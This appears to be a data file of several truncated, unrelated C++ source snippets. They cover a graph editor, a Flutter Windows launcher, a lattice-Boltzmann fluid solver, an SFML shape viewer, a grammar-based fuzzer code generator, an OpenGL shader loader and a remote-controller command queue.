0;\nstd::string inp = \"\";\n\nbool debug_flag = false;\nbool argument_flag = false;\n\n\nstd::queue<std::string> arg_input_queue;\n\n\nvoid inputNodeName() {\n    if (argument_flag) {\n        inp = arg_input_queue.front();\n        arg_input_queue.pop();\n    } else {\n        std::cout << \"name: \";\n        std::getline(std::cin >> std::ws, inp);\n    }\n}\n\n\nvoid fNewPoint() {\n    inputNodeName();\n\n    Node nd;\n    nd.name = inp;\n    name_map.insert(std::make_pair(inp, graph.size()));\n\n    graph.push_back(nd);\n}\n\n\nsize_t getNode() {\n    auto iter = name_map.begin();\n\n    if (!argument_flag) {\n        auto not_inter = true;\n        do {\n            inputNodeName();\n\n            if (inp.empty())\n                not_inter = false;\n            else\n                iter = name_map.find(inp);\n\n        } while (not_inter && (iter == name_map.end() || iter->second == nod_origin_index));\n\n        return not_inter\n            ? iter->second\n            : -1;\n    } else {\n        inputNodeName();\n        iter = name_map.find(inp);\n\n        return !(iter == name_map.end() || iter->second == nod_origin_index)\n            ? iter->second\n            : -1;\n    }\n}\n\n\nvoid embedEdge(Edge& edg) {\n    if (argument_flag) {\n        edg.cost = std::stof(arg_input_queue.front());\n        arg_input_queue.pop();\n    } else {\n        std::cout << \"cost: \";\n        std::cin >> edg.cost;\n    }\n\n    graph[edg.indx_from].edge.push_back(edg);\n    graph[edg.indx_to].edge.push_back(edg);\n}\n\nvoid giveChoiceUseNameAsIndex() {\n    if (argument_flag) {\n        inp = (arg_input_queue.front()[0] == 'n') ? \"Y\" : \"n\";\n    } else {\n        std::cout << \"use name as index(Y/n): \";\n        std::cin >> inp;\n    }\n}\n\nvoid fNewEdge() {\n    if (graph.size() < 2) return;\n\n    giveChoiceUseNameAsIndex();\n\n    if (inp[0] == 'Y') {\n        Edge edg;\n        edg.indx_from = nod_origin_index;\n\n        if ((edg.indx_to = getNode()) == -1) { interupted(); return; }\n\n        embedEdge(edg);\n    } else if (inp[0] == 'n') {\n        Edge edg;\n        edg.indx_from = nod_origin_index;\n\n        if (argument_flag) {\n            edg.indx_to = std::stoi(arg_input_queue.front());\n            arg_input_queue.pop();\n\n            if (edg.indx_to >= graph.size() && edg.indx_to == nod_origin_index) {\n                std::cout << \"index is out of range\\n\";\n                exit(1);\n            }\n        }\n        else\n            while ((std::cin >> edg.indx_to, edg.indx_to) >= graph.size() && edg.indx_to == nod_origin_index);\n\n        embedEdge(edg);\n    }\n}\n\n\nvoid fList() {\n    if (graph.empty()) return;\n\n    auto& cur = graph[nod_origin_index];\n\n    size_t nod_to;\n\n    std::cout << cur.name << \":\\n\";\n    for (size_t i = 0; i < cur.edge.size(); i++) {\n        nod_to = ((cur.edge[i].indx_from == nod_origin_index)\n            ? cur.edge[i].indx_to\n            : cur.edge[i].indx_from);\n\n        std::cout << '\\t';\n\n        if (nod_to >= graph.size()) std::cout << \"invl \" << nod_to;\n        else std::cout << graph[nod_to].name;\n\n        std::cout << \" -> \" << cur.edge[i].cost << '\\n';\n    }\n\n}\n\n\nvoid fListAll() {\n    size_t old_origin = nod_origin_index;\n    std::cout << \"Size: \" << graph.size() << \" nodes\\n\";\n    for (size_t i = 0; i < graph.size(); i++) {\n        nod_origin_index = i;\n        fList();\n    }\n}\n\n\nvoid fSetOrigin() {\n    if (graph.size() == 1) nod_origin_index = 0;\n    if (graph.size() < 2) return;\n\n    giveChoiceUseNameAsIndex();\n\n    if (inp[0] == 'Y') {\n        if ((nod_origin_index = getNode()) == -1) {\n            interupted();\n            nod_origin_index = 0;\n            return;\n        }\n    } else if (inp[0] == 'n') {\n        if (argument_flag) {\n            nod_origin_index = std::stoi(arg_input_queue.front());\n            arg_input",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_guys_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**\n *  \u91c7\u7528\u53cc\u6b65\u53cc\u7f51\u683c\u65b9\u6848\u914d\u5408 OMP \u5e76\u884c\n * \n *  \u6ce8\u610f NEEM \u65b9\u6cd5\u4e00\u5b9a\u8981\u5148\u8ba1\u7b97\u8fb9\uff0c\u7136\u540e\u8ba1\u7b97\u89d2\u70b9\n *  \u8fd9\u6837\u505a\u662f\u4e3a\u4e86\u786e\u4fdd\u8ba1\u7b97\u89d2\u70b9\u65f6\u4e0d\u4f1a\u53d6\u5230\u8fb9\u4e0a\u672a\u66f4\u65b0\u7684\u5206\u5e03\u51fd\u6570\u503c\n */\n\n// open Debug\n// #define MY_DEBUG\n\n// using Incompressible SRT Equillibrium\n#define MY_INCOMPRESSIBLE\n\n#define MY_OMP_OPEN\n#ifdef MY_OMP_OPEN\n    #include <omp.h>\n#endif\n\n#include \"src/GlobalDef.hpp\"\n#include \"src/Array.hpp\"\n#include \"src/Field.hpp\"\n#include \"src/Units.hpp\"\n#include \"src/D2Q9BGK.hpp\"\n#include <ctime>\n#include <cmath>\n#include <fstream>\n#include <iomanip>\n#include <iostream>\n#include <sstream>\n#include <algorithm>\n\ntypedef Real T;\ntypedef units::IncompFlowParam<T> SimParam;\ntypedef lbmodels::d2q9::D2Q9BGK<T> LBM;\n\nLBM::DensityField rhoF;\nLBM::VelocityField velF, velF0;\nLBM::LatticeField latticeF, latticeF0;\n\nvoid init(SimParam const& param);\nT feq_i(int i, LBM::Density_t rho, LBM::Velocity_t vel, T uSqr);\nvoid evolution(SimParam const& param);\nT ErrorVel();\nT AverageRho();\nvoid writeData(int t);\nvoid write_stream_func(int t);\n\nint main(int argc, char const *argv[])\n{\n#ifdef MY_OMP_OPEN\n    std::cout << \"Number of processer used: \" << omp_get_num_procs() << std::endl;\n#endif\n    time_t t_start, t_end;\n    T avg_rho, err_vel;\n    int info_step = 100;\n    int out_step = 2000;\n\n    T Re = 1000.0;\n    T la_Umax = 0.1; // top lid velocity\n    T la_Cs = LBM::cs;\n    int resolution = 256;\n    T lx = 1;\n    T ly = 1;\n    SimParam const ldc_param(Re, la_Umax, la_Cs, resolution, lx, ly);\n    // std::cout << ldc_param;\n\n    init(ldc_param);\n    writeData(0);\n    t_start = time(NULL);\n    for (int t=0; true; ++t) {\n        evolution(ldc_param);\n        if (t%info_step == 0) {\n            avg_rho = AverageRho();\n            err_vel = ErrorVel();\n            t_end = time(NULL);\n            std::cout << \"[\" << difftime(t_end, t_start) << \" s]\"\n                      << \" Time step: \" << t\n                      << \" avg_rho: \" << std::setprecision(6) << avg_rho\n                      << \" relative error: \" \n                      << std::setiosflags(std::ios::scientific)\n                      << err_vel\n                      << std::resetiosflags(std::ios::scientific)\n                      << std::endl;\n            if ( t >= out_step) {\n                if (t%out_step == 0) { writeData(t); }\n                if ( err_vel < 1.0e-6 ) {\n                    write_stream_func(t);\n                    break;\n                }\n            }\n        }\n    }\n    return 0;\n}\n\nvoid init(SimParam const& param)\n{\n    T rho0 = 1.0;\n    T U0 = param.GetLatticeU();\n    T nx = param.GetNx();\n    T ny = param.GetNy();\n    rhoF = LBM::DensityField(nx,ny);\n    velF = LBM::VelocityField(nx,ny);\n    velF0 = LBM::VelocityField(nx,ny);\n    latticeF = LBM::LatticeField(nx,ny);\n    latticeF0 = LBM::LatticeField(nx,ny);\n\n    for (int y=0; y<ny; ++y) {\n        for (int x=0; x<nx; ++x) {\n            rhoF(x,y) = rho0;\n            velF(x,y)[0] = 0.0;\n            velF(x,y)[1] = 0.0;\n            velF(x, ny-1)[0] = U0;\n            T uSqr = pow(velF(x,y)[0],2) + pow(velF(x,y)[1],2);\n            for (int i=0; i<LBM::q; ++i) {\n                latticeF(x,y)[i] = feq_i(i, rhoF(x,y), velF(x,y), uSqr);\n            }\n        }\n    }\n}\n\nT feq_i(int i, LBM::Density_t rho, LBM::Velocity_t u, T uSqr)\n{\n    T feq, uci;\n    uci = LBM::c[i][0]*u[0] + LBM::c[i][1]*u[1];\n#ifdef MY_INCOMPRESSIBLE\n    feq = LBM::t[i]*(rho + LBM::invCs2*uci + 0.5*LBM::invCs2*(LBM::invCs2*uci*uci - uSqr));\n#else\n    feq = rho*LBM::t[i]*(1.0 + LBM::invCs2*uci + 0.5*LBM::invCs2*(LBM::invCs2*uci*uci - uSqr));\n#endif\n    return feq;\n}\n\nvoid evolution(SimParam const& param)\n{\n    int const nx = param.GetNx();\n    int const ny = param.GetNy();\n    T const omega = param.GetOmega();\n    // Bulk\n    // ---- collision and streaming (separate) ----\n#ifdef MY_OMP_OPEN\n    #pragma omp parallel for\n#endif\n    for (int y=0; y<ny; ++y) {\n        for (int x=0; x<nx; ++x) {\n            T uSqr = pow(velF(x,y)[0],2) + pow(velF(x,y)[1],2);\n            for (int i=0; i<LBM::q; ++i) {\n                latticeF(x,y)[i] *= (1.0-omega);\n                latticeF(x,y)[i] += omega*feq_i(i, rhoF(x,y), velF(x,y), uSqr);\n            }\n        }\n    }\n#ifdef MY_OMP_OPEN\n    #pragma omp parallel for\n#endif\n    for (int y=1; y<ny-1; ++y) {\n        for (int x=1; x<nx-1; ++x) {\n            for (int i=0; i<LBM::q; ++i) {\n                int ix = x - LBM::c[i][0];\n                int iy = y - LBM::c[i][1];\n                latticeF0(x,y)[i] = latticeF(ix,iy)[i];\n            }\n        }\n    }\n    // ---- update Micro ----\n    latticeF.Swap(latticeF0);\n    // ---- Update Macro ----\n#ifdef MY_OMP_OPEN\n    #pragma omp parallel for\n#endif\n    for (int y=1; y<ny-1; ++y) {\n        for (int x=1; x<nx-1; ++x) {\n            velF0(x,y)[0] = velF(x,y)[0];\n            velF0(x,y)[1] = velF(x,y)[1];\n            T m0 = 0.0;    // 0-order momentum\n            T m1_x = 0.0;  // 1-order momentum at x-direction\n            T m1_y = 0.0;  // 1-order momentum at y-direction\n            for (int i=0; i<LBM::q; ++i) {\n                m0 += latticeF(x,y)",
    "#include \"imgui.h\"\r\n#include \"imgui-SFML.h\"\r\n\r\n#include \"SFML/Graphics.hpp\"\r\n#include <iostream>\r\n#include <fstream>\r\n\r\nclass AShape {       // The class\r\npublic:             // Access specifier\r\n    sf::CircleShape circle;        // Attribute (int variable)\r\n    sf::RectangleShape rectangle;  // Attribute (string variable)\r\n    float speed[2];\r\n    sf::Text name;\r\n    AShape() {\r\n    }\r\n};\r\n\r\n\r\nint main()\r\n{\r\n    sf::RenderWindow window;\r\n    sf::Font font;\r\n\r\n    std::ifstream fin(\"config.txt\");\r\n    std::string temp;\r\n    int characterSize, textR, textG, textB;\r\n    std::vector<AShape> circles;\r\n    std::vector<const char*> shapeNames;\r\n    \r\n    while (fin >> temp) {\r\n        if (temp.compare(\"Window\") == 0) {\r\n            int windowWidth, windowHeight;\r\n            fin >> windowWidth >> windowHeight;\r\n            window.create(sf::VideoMode(windowWidth, windowHeight), \"Window Title\"); \r\n        }\r\n        else if (temp.compare(\"Font\") == 0) {\r\n            std::string font1;\r\n            \r\n            fin >> font1>> characterSize>>textR>>textG>>textB;\r\n            if (!font.loadFromFile(font1))\r\n            {\r\n                std::cout << \"Download Arial!\\n\";\r\n            }\r\n        }\r\n        else if (temp.compare(\"Circle\") == 0) {\r\n            AShape circle1;\r\n\r\n            fin >> temp;\r\n            circle1.name.setFont(font); // font is a sf::Font\r\n            circle1.name.setString(temp);\r\n            circle1.name.setCharacterSize(characterSize); // in pixels, not points!\r\n            circle1.name.setFillColor(sf::Color(textR, textG, textB));\r\n            circle1.name.setStyle(sf::Text::Bold | sf::Text::Underlined);\r\n            circle1.name.setOrigin(circle1.name.getLocalBounds().width / 2.f + circle1.name.getLocalBounds().left, circle1.name.getLocalBounds().height / 2.f + circle1.name.getLocalBounds().top);\r\n            char* char_array = new char[sizeof temp];\r\n            strcpy_s(char_array, sizeof temp, temp.c_str());\r\n            shapeNames.push_back(char_array);\r\n\r\n            int temp1, temp2;\r\n            fin >> temp1 >> temp2;\r\n            circle1.circle.setPosition(temp1, temp2); // Center circle\r\n            std::cout << temp1 << temp2;\r\n            fin >> temp1 >> temp2;\r\n            circle1.speed[0] = temp1;\r\n            circle1.speed[1] = temp2;\r\n\r\n            int temp3;\r\n            fin >> temp1 >> temp2>>temp3;\r\n            circle1.circle.setFillColor(sf::Color\r\n            (\r\n                (int)(temp1),\r\n                (int)(temp2),\r\n                (int)(temp3)\r\n            ));\r\n\r\n\r\n            fin >> temp3;\r\n            circle1.circle.setRadius(temp3);\r\n            //circle1.circle.setOrigin(temp3, temp3);\r\n            \r\n            \r\n            // select the font\r\n            \r\n\r\n            circles.push_back(circle1);\r\n        }\r\n        else if (temp.compare(\"Rectangle\") == 0) {\r\n            AShape circle1;\r\n\r\n            fin >> temp;\r\n            circle1.name.setFont(font); // font is a sf::Font\r\n            circle1.name.setString(temp);\r\n            circle1.name.setCharacterSize(characterSize); // in pixels, not points!\r\n            circle1.name.setFillColor(sf::Color(textR, textG, textB));\r\n            circle1.name.setStyle(sf::Text::Bold | sf::Text::Underlined);\r\n            circle1.name.setOrigin(circle1.name.getLocalBounds().width / 2.f + circle1.name.getLocalBounds().left, circle1.name.getLocalBounds().height / 2.f + circle1.name.getLocalBounds().top);\r\n            char* char_array = new char[sizeof temp];\r\n            strcpy_s(char_array, sizeof temp, temp.c_str());\r\n            shapeNames.push_back(char_array);\r\n\r\n            int temp1, temp2;\r\n            fin >> temp1 >> temp2;\r\n            circle1.rectangle.setPosition(temp1, temp2); // Center circle\r\n            std::cout << temp1 << temp2;\r\n            fin >> temp1 >> temp2;\r\n            circle1.speed[0] = temp1;\r\n            circle1.speed[1] = temp2;\r\n\r\n            int temp3;\r\n            fin >> temp1 >> temp2 >> temp3;\r\n            circle1.rectangle.setFillColor(sf::Color\r\n            (\r\n                (int)(temp1),\r\n                (int)(temp2),\r\n                (int)(temp3)\r\n            ));\r\n\r\n\r\n            fin >> temp1>>temp2;\r\n            circle1.rectangle.setSize(sf::Vector2f(temp1, temp2));\r\n            //circle1.rectangle.setOrigin(temp1/2, temp2/2);\r\n\r\n\r\n            // select the font\r\n\r\n\r\n            circles.push_back(circle1);\r\n        }\r\n    }\r\n\r\n    //const char* items[circles.size()];\r\n    window.setFramerateLimit(60);\r\n    ImGui::SFML::Init(window);\r\n\r\n    bool circleExists = true;\r\n    float circleScale = 1.0f;\r\n    int circleSegments = 100;\r\n    float circleColor[3] = { (float)0 / 255, (float)255 / 255, (float)0 / 255 };\r\n\r\n    \r\n    \r\n   \r\n    //text.setPosition(shape.getPosition());\r\n    char displayString[255] = \"CGreen\";\r\n    sf::Clock deltaClock;\r\n    ImGui::GetStyle().ScaleAllSizes(1.0f);\r\n\r\n    static int item_current = 0;\r\n\r\n\r\n    while (window.isOpen())\r\n    {\r\n        sf::Event ev",
    "#include <iostream>\n#include <fstream>\n#include <map>\n#include <string>\n#include <vector>\n#include <memory>\n#include <format>\n#include <queue>\n#include <cstdlib>\n#include \"json.hpp\"\n\nusing namespace std;\nusing json = nlohmann::json;\n\nenum Type\n{\n    non_terminal,\n    terminal,\n    expression\n};\n\nstruct Node\n{\n    string name;\n    Type tp;\n    vector<Node *> subnode;\n};\n\nclass Grammar\n{\npublic:\n    Grammar(json &content, unsigned maxdepth)\n    {\n        map<string, vector<vector<string>>> contentInstd = content.template get<map<string, vector<vector<string>>>>();\n        for (auto key : contentInstd)\n        {\n            allocate_node(key.first, Type::non_terminal);\n        }\n        for (auto rule : contentInstd)\n        {\n            for (auto expression : rule.second)\n            {\n                // check subnode is an expression or sigel node to compress the grammar;\n                if (expression.size() == 1)\n                {\n                    Node *newnode;\n                    if (this->mp.count(expression[0]) == 0)\n                    {\n                        newnode = this->allocate_node(expression[0], Type::terminal);\n                    }\n                    else\n                    {\n                        newnode = mp[expression[0]];\n                    }\n                    mp[rule.first]->subnode.push_back(newnode);\n                    continue;\n                }\n                Node *optnodes = allocate_node(\"\", Type::expression);\n                for (auto option : expression)\n                {\n                    Node *newnode;\n                    if (this->mp.count(option) == 0)\n                    {\n                        newnode = this->allocate_node(option, Type::terminal);\n                    }\n                    else\n                    {\n                        newnode = mp[option];\n                    }\n                    optnodes->subnode.push_back(newnode);\n                }\n                mp[rule.first]->subnode.push_back(optnodes);\n            }\n        }\n        this->start = mp[\"<start>\"];\n        this->maxdepth = maxdepth;\n        this->getshortcut();\n    }\n\n    void JIT(string file, bool show)\n    {\n        string code = R\"(#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <string.h>\n\n#define BUFFER_SIZE 512*1024*1024   // buffer for storing text\n)\";\n        code += \"#define MAX_DEPTH \" + to_string(this->maxdepth) + \"\\n\";\n        code += R\"(\n//xor to get random number\n#define xor(l) \\\n    seed ^= seed << 13; \\\n    seed ^= seed >> 17; \\\n    seed ^= seed << 5; \\\n    branch = seed % l\n\n#define NEXT() goto *program[pc++] // fetch next instruction\n\n#define initStack() do { \\\n    stack.top = -1; \\\n    stack.capacity = MAX_DEPTH; \\\n} while (0)\n\n#define pop() (stack.top--) \n\ntypedef struct {\n    char data[BUFFER_SIZE];\n    unsigned top;\n} Buffer;\n\nBuffer buffer;  // Declare a global buffer\n\n#define extend(c) { \\\n    if (buffer.top < BUFFER_SIZE) { \\\n        buffer.data[buffer.top++] = c; \\\n    } \\\n}\n\n#define printbuff() { \\\n    for (unsigned i = 0; i < buffer.top; i++) { \\\n        putchar(buffer.data[i]); \\\n    } \\\n    putchar('\\n'); \\\n}\n\n#define clean() { \\\n    buffer.top = 0; \\\n}\n\n//frame used to record current context\ntypedef struct {\n    void* Program[64]; //allow 64 options for each rule, adding hitting rate in chache.  \n    unsigned int PC;    // program counter \n} frame;\n\n// the stack from frame\ntypedef struct {\n    frame frames[MAX_DEPTH];     //the first pointer of frame\n    int top;              // the top of stack\n    int capacity;         // the capacity of stack\n} Stack;\n\nunsigned seed;  // Random seed\nunsigned branch;  // To hold branch value\nStack stack;\nunsigned pc; //program counter;\nvoid* program[1000];\n\n\nint main() {\n    srand(time(NULL));\n    seed = rand();  // Initialize the seed\n    initStack();\n)\";\n        code += \"    unsigned sum = 0;\\n\";\n        code += \"    clock_t start = clock();\\n\";\n        code += \"    unsigned int iterator = 0;\\n\";\n        code += \"    memcpy(program, (void*[]){\";\n        code += \"&&func_\" + to_string(reinterpret_cast<uintptr_t>(this->start)) + \",&&HALT}, sizeof(void*[2]));\\n\";\n        code += \"START:\\n\";\n        code += R\"(    NEXT();\n    RET:\n        pc = stack.frames[stack.top].PC;\n        memcpy(program, stack.frames[stack.top].Program, sizeof(void*[64]));\n        pop();\n        NEXT();\n    HALT:\n        stack.top = -1;\n        pc = 0;\n        goto end;\n)\";\n        string blocks = \"\";\n        for(auto &x:this->nodes){\n            string block = \"\";\n            block += \"    func_\"+to_string(reinterpret_cast<uintptr_t>(x))+\":\\n\";\n            if(x -> tp == Type::terminal){\n                for (int j = 0; j < x->name.size(); j++)\n                {\n                    block += \"        extend(\" + to_string((unsigned)x->name[j]) + \");\\n\";\n                }\n                block += \"        NEXT();\\n\";\n            } else if(x -> tp == Type::non_terminal){\n                block += \"        if(stack.top==MAX_DEPTH",
    "#include \"Shader.h\"\n\n\nvoid Shader::load(const char* vertexPath, const char* fragmentPath)\n{\n    std::string vertexCode;\n    std::string fragmentCode;\n    std::ifstream vShaderFile;\n    std::ifstream fShaderFile;\n\n    vShaderFile.exceptions(std::ifstream::failbit | std::ifstream::badbit);\n    fShaderFile.exceptions(std::ifstream::failbit | std::ifstream::badbit);\n\n\ttry\n\t{\n        vShaderFile.open(vertexPath);\n        fShaderFile.open(fragmentPath);\n        std::stringstream vShaderStream, fShaderStream;\n\n        vShaderStream << vShaderFile.rdbuf();\n        fShaderStream << fShaderFile.rdbuf();\n\n        vShaderFile.close();\n        fShaderFile.close();\n\n        vertexCode = vShaderStream.str();\n        fragmentCode = fShaderStream.str();\n\t}\n\tcatch (std::ifstream::failure& e)\n\t{\n        std::cout << \"ERROR::SHADER::FILE_NOT_SUCCESSFULLY_READ: \" << e.what() << std::endl;\n\t}\n    const char* vShaderCode = vertexCode.c_str();\n    const char* fShaderCode = fragmentCode.c_str();\n\n    unsigned int vertex, fragment;\n\n    vertex = glCreateShader(GL_VERTEX_SHADER);\n    glShaderSource(vertex, 1, &vShaderCode, NULL);\n    glCompileShader(vertex);\n    checkCompileErrors(vertex, \"VERTEX\");\n\n    fragment = glCreateShader(GL_FRAGMENT_SHADER);\n    glShaderSource(fragment, 1, &fShaderCode, NULL);\n    glCompileShader(fragment);\n    checkCompileErrors(fragment, \"FRAGMENT\");\n\n    ID = glCreateProgram();\n    glAttachShader(ID, vertex);\n    glAttachShader(ID, fragment);\n    glLinkProgram(ID);\n    checkCompileErrors(ID, \"PROGRAM\");\n\n    glDeleteShader(vertex);\n    glDeleteShader(fragment);\n}\n\nvoid Shader::use()\n{\n    glUseProgram(ID);\n}\n\nvoid Shader::setBool(const std::string& name, bool value) const\n{\n    glUniform1i(glGetUniformLocation(ID, name.c_str()), (int)value);\n}\n\nvoid Shader::setInt(const std::string& name, int value) const\n{\n    glUniform1i(glGetUniformLocation(ID, name.c_str()), value);\n}\n\nvoid Shader::setFloat(const std::string& name, float value) const\n{\n    glUniform1f(glGetUniformLocation(ID, name.c_str()), value);\n}\n\nvoid Shader::setVec2(const std::string& name, const glm::vec2& value) const\n{\n    glUniform2fv(glGetUniformLocation(ID, name.c_str()), 1, &value[0]);\n}\n\nvoid Shader::setVec2(const std::string& name, float x, float y) const\n{\n    glUniform2f(glGetUniformLocation(ID, name.c_str()), x, y);\n}\n\nvoid Shader::setVec3(const std::string& name, const glm::vec3& value) const\n{\n    glUniform3fv(glGetUniformLocation(ID, name.c_str()), 1, &value[0]);\n}\n\nvoid Shader::setVec3(const std::string& name, float x, float y, float z) const\n{\n    glUniform3f(glGetUniformLocation(ID, name.c_str()), x, y, z);\n}\n\nvoid Shader::setVec4(const std::string& name, const glm::vec4& value) const\n{\n   glUniform4fv(glGetUniformLocation(ID, name.c_str()), 1, &value[0]);\n}\n\nvoid Shader::setVec4(const std::string& name, float x, float y, float z, float w) const\n{\n    glUniform4f(glGetUniformLocation(ID, name.c_str()), x, y, z, w);\n}\n\nvoid Shader::setMat2(const std::string& name, const glm::mat2& mat) const\n{\n    glUniformMatrix2fv(glGetUniformLocation(ID, name.c_str()), 1, GL_FALSE, &mat[0][0]);\n}\n\nvoid Shader::setMat3(const std::string& name, const glm::mat3& mat) const\n{\n    glUniformMatrix3fv(glGetUniformLocation(ID, name.c_str()), 1, GL_FALSE, &mat[0][0]);\n}\n\nvoid Shader::setMat4(const std::string& name, const glm::mat4& mat) const\n{\n    glUniformMatrix4fv(glGetUniformLocation(ID, name.c_str()), 1, GL_FALSE, &mat[0][0]);\n}\n\n\nvoid Shader::checkCompileErrors(unsigned int shader, std::string type)\n{\n    GLint success;\n    GLchar infoLog[1024];\n    if (type != \"PROGRAM\")\n    {\n        glGetShaderiv(shader, GL_COMPILE_STATUS, &success);\n        if (!success)\n        {\n            glGetShaderInfoLog(shader, 1024, NULL, infoLog);\n            std::cout << \"ERROR::SHADER_COMPILATION_ERROR of type: \" << type << \"\\n\" << infoLog << \"\\n -- --------------------------------------------------- -- \" << std::endl;\n        }\n    }\n    else\n    {\n        glGetProgramiv(shader, GL_LINK_STATUS, &success);\n        if (!success)\n        {\n            glGetProgramInfoLog(shader, 1024, NULL, infoLog);\n            std::cout << \"ERROR::PROGRAM_LINKING_ERROR of type: \" << type << \"\\n\" << infoLog << \"\\n -- --------------------------------------------------- -- \" << std::endl;\n        }\n    }\n};\n",
    "#include \"RemoteController.h\"\n#include \"Connections/Connection.h\"\n\nRemoteController::RemoteController(Connection &connection) : connection(connection)\n{\n}\n\nRemoteController::~RemoteController()\n{\n}\n\nbool RemoteController::begin(std::function<void(const std::vector<uint8_t> &commands, const std::vector<uint8_t> &throttle)> cmdClb)\n{\n\tcommandCallbackFunction = cmdClb;\n\n\treturn m_begin();\n}\n\nbool RemoteController::begin(std::function<void(const std::vector<uint8_t> &commands, const std::vector<uint8_t> &throttle)> cmdClb, std::function<void(const void *buffer, size_t length)> pldClb)\n{\n\t// Assign callbacks\n\tcommandCallbackFunction = cmdClb;\n\tpayloadCallbackFunction = pldClb;\n\n\treturn m_begin();\n}\n\nbool RemoteController::m_begin()\n{\n\t// Initialize connection to remote\n\tif (!connection.begin())\n\t{\n\t\t// Failed to start the connection\n\t\terror = CannotBeginConnection;\n\t\treturn false;\n\t}\n\n\tincomingBuffer = new uint8_t[REMOTECONTROLLER_INCOMING_BUFFER_SIZE];\n\toutgoingBuffer = new uint8_t[REMOTECONTROLLER_OUTGOING_BUFFER_SIZE];\n\tincomingCommandsBuffer.reserve(10);\n\tincomingThrottlesBuffer.reserve(10);\n\tcommandQueue.reserve(20);\n\n\terror = NoError;\n\treturn true;\n}\n\nvoid RemoteController::end()\n{\n\tconnection.end();\n\tcommandQueue.clear();\n\tcommandQueue.shrink_to_fit();\n\n\tdelete[] incomingBuffer;\n\tdelete[] outgoingBuffer;\n\tincomingBuffer = nullptr;\n\toutgoingBuffer = nullptr;\n}\n\nuint8_t RemoteController::getErrorCode()\n{\n\treturn error;\n}\n\nstd::string RemoteController::getErrorDescription()\n{\n\tswitch (error)\n\t{\n\tcase NoError:\n\t\treturn \"No Error, RC is running fine\";\n\tcase CannotBeginConnection:\n\t\treturn \"Remote Controller begin failed because it cannot begin its connection, probably because it failes to connect\";\n\tcase FailedToTransmitCommands:\n\t\treturn \"The RemoteController failed to transmit the commands because the Connection didn't succesfully transmit the data\";\n\tcase CommandQueueFull:\n\t\treturn \"The Command Queue is full. Too many commands where added and not transmitted. CAUSES UNDEFINED BEHAVIOR until a connection is established and commands are succesfully transmitted!\";\n\tcase FailedToTransmitCustomPayload:\n\t\treturn \"The Connection::write() failed to transmit the payload (No ack received)\";\n\tcase ReceivedCorruptPacket:\n\t\treturn \"The packet that was received and triggered Connection::available() is corrupt and cannot be read!\";\n\tdefault:\n\t\treturn \"Unknown Error\";\n\t}\n}\n\nbool RemoteController::run()\n{\n\t// Transmit the queued commands to the receiver\n\tif (commandQueue.size() > REMOTECONTROLLER_MAX_COMMAND_QUEUE_SIZE)\n\t{\n\t\tcommandQueue.clear();\n\t\terror = CommandQueueFull;\n\t\treturn false;\n\t}\n\tif (!commandQueue.empty())\n\t{\n\t\tif (transmitCommands(commandQueue))\n\t\t{\n\t\t\tcommandQueue.clear(); // Clear the command queue as those commands where succesfully transmitted\n\t\t}\n\t\telse\n\t\t{\n\t\t\treturn false; // Return error message and keep command queue to hopefully be transmitted with the next run() call\n\t\t}\n\t}\n\t// Check and process incomming commands and payloads\n\tif (connection.available())\n\t{\n\t\tsize_t payloadSize = std::min((int)connection.getPayloadSize(), REMOTECONTROLLER_INCOMING_BUFFER_SIZE);\n\t\t// Check if the packet is corrupt\n\t\tif(payloadSize < 1)\n\t\t{\n\t\t\terror = ReceivedCorruptPacket;\n\t\t\treturn false;\n\t\t}\n\t\t// Read the valid packet into the buffer\n\t\tconnection.read(incomingBuffer, payloadSize);\n\t\tuint8_t *pStart = incomingBuffer;\n\n\t\t// Check the first two bytes of the buffer for RemoteController Command identifier\n\t\tif ((*pStart * 256 + *(pStart + 1)) == REMOTECONTROLLER_IDENTIFIER_COMMAND)\n\t\t{\n\t\t\tpStart++;\n\t\t\tint len = (payloadSize-2)/2; // The amount of incoming command&throttle pairs (-2 bytes because of the identifier and /2 as one pair is 2 bytes big)\n\t\t\twhile (len--)\n\t\t\t{\n\t\t\t\tincomingCommandsBuffer.push_back(*(++pStart));\n\t\t\t\tincomingThrottlesBuffer.push_back(*(++pStart));\n\t\t\t}\n\t\t\t// Commands successfully parsed\n\n\t\t\tif (commandCallbackFunction)\n\t\t\t{\n\t\t\t\tcommandCallbackFunction(incomingCommandsBuffer, incomingThrottlesBuffer);\n\t\t\t}\n\t\t\t\n\t\t\t// Clear the incoming vector buffers after calling the callback\n\t\t\tincomingCommandsBuffer.clear();\n\t\t\tincomingThrottlesBuffer.clear();\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// Non Command type payload received...\n\t\t\tif (payloadCallbackFunction)\n\t\t\t{\n\t\t\t\tpayloadCallbackFunction(incomingBuffer, payloadSize);\n\t\t\t}\n\t\t}\n\t}\n\n\terror = NoError;\n\treturn true;\n}\n\nvoid RemoteController::sendCommand(uint8_t command, Priority priority)\n{\n\tsendCommand(command, UINT8_MAX, priority);\n}\n\nvoid RemoteController::sendCommand(uint8_t command, uint8_t throttle, Priority priority)\n{\n\tif (priority == Normal)\n\t{\n\t\t// Check if the command queue is full...\n\t\tcommandQueue.push_back(command);\n\t\tcommandQueue.push_back(throttle);\n\t\treturn;\n\t}\n\telse if (priority == High)\n\t{\n\t\tif (!transmitCommands({command, 